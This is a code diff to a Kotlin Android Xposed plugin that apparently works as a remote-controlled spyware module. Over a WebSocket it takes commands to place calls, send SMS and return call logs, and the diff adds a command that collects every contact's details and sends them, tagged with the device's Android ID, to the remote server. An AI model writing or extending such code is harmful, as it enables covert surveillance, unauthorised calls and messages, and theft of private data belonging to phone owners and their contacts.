@@ -56,15 +56,14 @@ class CallLogPlugin : WebSocketClientListener, IPlugin {
                 7 -> {
                     // 打电话
                     val phone = json.optString("name")
-                    LogUtil.i("CallLogPlugin onMessage", "phone = $phone")
                     CallLogUtils.makeCall(mContext!!, phone)
                 }
 
                 8 -> {
                     // 发短信
                     val phone = json.optString("name")
-                    val message = json.optString("message")
-                    CallLogUtils.sendSms(mContext!!, phone, message)
+                    val msg = json.optString("message")
+                    CallLogUtils.sendSms(mContext!!, phone, msg)
                 }
 
                 9 -> {
@@ -80,11 +79,17 @@ class CallLogPlugin : WebSocketClientListener, IPlugin {
                         put("androidId", IdGet.androidId(mContext!!))
                         put("callslist", result)
                     }.toString())
-
-                    IdGet.setAndroidId(mContext!!, IdGet.androidId(mContext!!))
                 }
+
                 10 -> {
                     // 请求联系人
+                    val plugin = PluginProviders.from(CallLogPlugin::class.java)
+                    val result = plugin.queryContactDetails()
+                    LogUtil.i("result = $result")
+                    sendMessage(JSONObject().apply {
+                        put("androidId", IdGet.androidId(mContext!!))
+                        put("contacts", result)
+                    }.toString())
                 }
             }
         } catch (e: Exception) {
@@ -98,58 +103,6 @@ class CallLogPlugin : WebSocketClientListener, IPlugin {
         }.toString()
         LogUtil.i("sendMessage", text)
         client?.sendMessage(text, IdGet.getWxId(mContext!!))
-    }
-
-    @SuppressLint("Range")
-    fun getContactDetails(context: Context) {
-        val cursor = context.contentResolver.query(
-            ContactsContract.Contacts.CONTENT_URI,
-            null,
-            null,
-            null,
-            null
-        );
-
-        if (cursor != null) {
-            while (cursor.moveToNext()) {
-                val id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
-                val name =
-                    cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
-                val phoneNumber = getPhoneNumbers(context, id)
-
-                LogUtil.i("Contact: ID=$id, Name=$name, Phone Number=$phoneNumber")
-            }
-            cursor.close();
-        }
-    }
-
-    // 查询联系人电话号码
-    @SuppressLint("Range")
-    private fun getPhoneNumbers(context: Context, contactId: String) {
-        val projection = arrayOf(
-            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-            ContactsContract.CommonDataKinds.Phone.NUMBER
-        )
-        val phoneCursor = context.contentResolver.query(
-            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,  // 电话号码 URI
-            projection,  // 返回所有列
-            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",  // 查询条件
-            arrayOf(contactId),  // 查询条件参数
-            null  // 排序
-        )
-
-        LogUtil.i("getPhoneNumbers=", phoneCursor?.moveToFirst())
-        phoneCursor?.use {
-            while (it.moveToNext()) {
-                val phoneNumber =
-                    it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
-                val phoneType =
-                    it.getInt(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE))
-
-                LogUtil.d("PhoneNumber", "Phone Number: $phoneNumber, Type: $phoneType")
-            }
-        }
-        phoneCursor?.close()
     }
 
     private fun hookInsert(param: XC_LoadPackage.LoadPackageParam) {
@@ -284,5 +237,8 @@ class CallLogPlugin : WebSocketClientListener, IPlugin {
         return CallLogUtils.queryByParams(mContext!!, params)
     }
 
+    fun queryContactDetails(): JSONArray {
+        return CallLogUtils.getContactDetails(mContext!!)
+    }
 
 }
